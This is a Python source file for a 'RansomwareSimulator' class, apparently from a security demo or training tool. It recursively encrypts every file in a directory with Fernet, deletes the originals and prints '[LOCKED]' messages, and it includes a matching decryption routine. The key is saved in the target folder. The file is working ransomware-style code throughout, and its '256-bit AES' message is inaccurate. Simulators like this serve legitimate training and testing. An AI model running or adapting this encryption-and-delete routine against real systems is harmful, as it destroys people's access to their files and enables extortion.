from cryptography.fernet import Fernet
import os
import time

class RansomwareSimulator:
    def __init__(self, logger):
        self.logger = logger
        self.key = Fernet.generate_key()
        self.cipher = Fernet(self.key)

    def encrypt_directory(self, target_dir):
        self.logger.log_event("Ransomware", "Start", f"Encrypting {target_dir}")
        encrypted_files = []
        
        if not os.path.exists(target_dir):
             self.logger.log_event("Ransomware", "Error", f"Directory {target_dir} does not exist", status="ERROR")
             return []

        print(f"[*] Initiating Ransomware Payload in {target_dir}")
        print("[*] Generating 256-bit AES encryption key...")
        time.sleep(1)
        
        for root, dirs, files in os.walk(target_dir):
            for file in files:
                # Skip already encrypted files and the key file
                if file.endswith(".enc") or file == "key.key":
                    continue
                    
                file_path = os.path.join(root, file)
                print(f"  > Encrypting {file}...", end=" ", flush=True)
                time.sleep(0.5)
                
                try:
                    with open(file_path, "rb") as f:
                        data = f.read()
                    encrypted_data = self.cipher.encrypt(data)
                    with open(file_path + ".enc", "wb") as f:
                        f.write(encrypted_data)
                    os.remove(file_path)
                    encrypted_files.append(file_path)
                    print(f"\033[91m[LOCKED]\033[0m")
                    self.logger.log_event("Ransomware", "Encrypted", file_path)
                except Exception as e:
                    print(f"[FAILED] {e}")
                    self.logger.log_event("Ransomware", "Error", f"Failed to encrypt {file_path}: {e}", status="ERROR")
        
        print("[*] Encryption Complete. Key saved.")
        
        # Save key
        with open(os.path.join(target_dir, "key.key"), "wb") as f:
            f.write(self.key)
            
        return encrypted_files

    def decrypt_directory(self, target_dir, key_path=None):
        if key_path:
            try:
                with open(key_path, "rb") as f:
                    self.key = f.read()
                self.cipher = Fernet(self.key)
            except Exception as e:
                self.logger.log_event("Ransomware", "Error", f"Failed to load key: {e}", status="ERROR")
                return

        self.logger.log_event("Ransomware", "Start", f"Decrypting {target_dir}")
        
        for root, dirs, files in os.walk(target_dir):
            for file in files:
                if file.endswith(".enc"):
                    file_path = os.path.join(root, file)
                    try:
                        with open(file_path, "rb") as f:
                            data = f.read()
                        decrypted_data = self.cipher.decrypt(data)
                        original_path = file_path[:-4]
                        with open(original_path, "wb") as f:
                            f.write(decrypted_data)
                        os.remove(file_path)
                        self.logger.log_event("Ransomware", "Decrypted", original_path)
                    except Exception as e:
                        self.logger.log_event("Ransomware", "Error", f"Failed to decrypt {file_path}: {e}", status="ERROR")
